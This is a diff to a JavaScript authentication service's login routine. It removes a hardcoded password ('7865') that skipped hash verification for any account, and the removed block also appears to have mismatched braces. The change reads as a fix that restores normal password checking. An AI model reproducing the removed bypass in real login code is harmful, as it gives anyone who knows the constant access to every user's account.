@@ -519,18 +519,21 @@ class AuthService {
         favoriteTeams: []
       };
       this.users.set(foundUser.id, foundUser);
-    } else if (password !== '7865') {
-    // If user exists without passwordHash (e.g. created before password hashing or OAuth), set it on first login
-    if (!foundUser.passwordHash || !foundUser.salt) {
-      foundUser.salt = crypto.randomBytes(16).toString('hex');
-      foundUser.passwordHash = this.hashPassword(password, foundUser.salt);
-      this.persistUsers();
     } else {
-      const inputHash = this.hashPassword(password, foundUser.salt);
-      if (inputHash !== foundUser.passwordHash) {
+      if (!foundUser) {
         throw new Error('Invalid username/email or password');
       }
-    }
+      // If user exists without passwordHash (e.g. created before password hashing or OAuth), set it on first login
+      if (!foundUser.passwordHash || !foundUser.salt) {
+        foundUser.salt = crypto.randomBytes(16).toString('hex');
+        foundUser.passwordHash = this.hashPassword(password, foundUser.salt);
+        this.persistUsers();
+      } else {
+        const inputHash = this.hashPassword(password, foundUser.salt);
+        if (inputHash !== foundUser.passwordHash) {
+          throw new Error('Invalid username/email or password');
+        }
+      }
     }
 
     if (!foundUser) {
